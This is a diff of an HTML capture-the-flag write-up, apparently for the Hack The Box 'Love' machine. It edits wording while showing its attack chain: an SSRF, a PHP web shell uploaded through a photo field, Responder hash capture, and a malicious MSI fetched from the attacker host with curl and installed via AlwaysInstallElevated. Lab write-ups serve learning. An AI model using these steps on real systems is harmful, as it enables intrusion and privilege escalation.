@@ -241,12 +241,12 @@ SF:L,4A,<span class="s2">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.51&#39;
 <li>An Apache web server that handles 3 websites on port 80, 443, and 5000 (this one is forbidden).</li>
 <li>SMB on port 445, good start.</li>
 <li>A MySQL server on port 3306, I will stay away from this for now because IP block</li>
-<li>WinRM on 5985/6, I will use this for lateral movement.</li>
+<li>WinRM on 5985/6, I will use this for lateral movement if I have creds.</li>
 </ul>
 <p>Seeing Apache and MySQL on a Windows host, I can assume that this machine uses XAMPP.</p>
-<p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code></p>
+<p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «love» «10.10.14.51» 
-$ sudo <span class="nb">echo</span> <span class="s1">&#39;www.love.htb staging.love.htb&#39;</span> &gt; /etc/hosts
+$ sudo <span class="nb">echo</span> <span class="s1">&#39;www.love.htb staging.love.htb&#39;</span> &gt;&gt; /etc/hosts
 </code></pre></div><h2 id="enumeration">Enumeration</h2>
 <h3 id="tcp-445---smb">TCP 445 - SMB</h3>
 <p>Anonymous login is not allowed here, I will re-visit this later when I have creds.</p>
@@ -337,13 +337,13 @@ connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <spa
 GET /iamf HTTP/1.1
 Host: 10.10.14.51
 Accept: */*
-</code></pre></div><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 hash.</p>
+</code></pre></div><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 response.</p>
 <p>Playing a bit with it reveals that it can render HTML.</p>
 <p><div class="img-container"><img src="imgs/image-20210809014613874.png" alt="image-20210809014613874"  /></div>
 </p>
 <p>The key take away from here is that <code>staging.love.htb/beta.php</code> <strong>can make a HTTP request.</strong></p>
 <h3 id="tcp-443---website">TCP 443 - Website</h3>
-<p>On HTTPS, the SSL certificate on leaks an email address and a potential username: <code>roy@love.htb</code>.</p>
+<p>On HTTPS, the SSL certificate leaks an email address and a potential username: <code>roy@love.htb</code>.</p>
 <p><div class="img-container"><img src="imgs/image-20210809005318725.png" alt="image-20210809005318725"  /></div>
 </p>
 <p>And both the HTTPS versions of <code>www.love.htb</code> and <code>staging.love.htb</code> return the Forbidden message error.</p>
@@ -378,7 +378,7 @@ Accept: */*
 <p>I will intercept the request to modify the photo section to a PHP web shell and then send it afterwards. It gets uploaded smoothly.</p>
 <p><div class="img-container"><img src="imgs/image-20210809040225250.png" alt="image-20210809040225250"  /></div>
 </p>
-<p>When I reload the page, I see the voter is there with broken photo, and that because it loads php as image.</p>
+<p>When I reload the page, I see the voter I added is there with broken photo, and that because it loads my PHP web shell as image.</p>
 <p><div class="img-container"><img src="imgs/image-20210809041027772.png" alt="image-20210809041027772"  /></div>
 </p>
 <p>The uploaded web shell is accessible at  <code>http://www.love.htb/images/shell.php</code>, and now I have code execution as <strong>phoebe</strong>.</p>
@@ -422,7 +422,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="s
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="shell-as-system">Shell as SYSTEM</h3>
 <h4 id="enumeration-1">Enumeration</h4>
-<p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means installation of an app always runs in elevated (SYSTEM) mode, and it can be abused to install a malicious <code>.msi</code> package.</p>
+<p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means installation of an app always runs in elevated mode (SYSTEM), and it can be abused to install a malicious <code>.msi</code> package.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[+] Checking AlwaysInstallElevated
    [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
     AlwaysInstallElevated set to 1 in HKLM!
@@ -437,7 +437,7 @@ No encoder specified, outputting raw payload
 Payload size: <span class="m">270</span> bytes
 Final size of msi file: <span class="m">159744</span> bytes
 Saved as: iamf.msi
-</code></pre></div><p>On Love, I will grab the msi and install the package it immediately.</p>
+</code></pre></div><p>On Love, I will grab the msi and install the package immediately.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; curl.exe -O 10.10.14.53/iamf.msi
 PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; msiexec /quiet /qn /i iamf.msi
 PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; net user
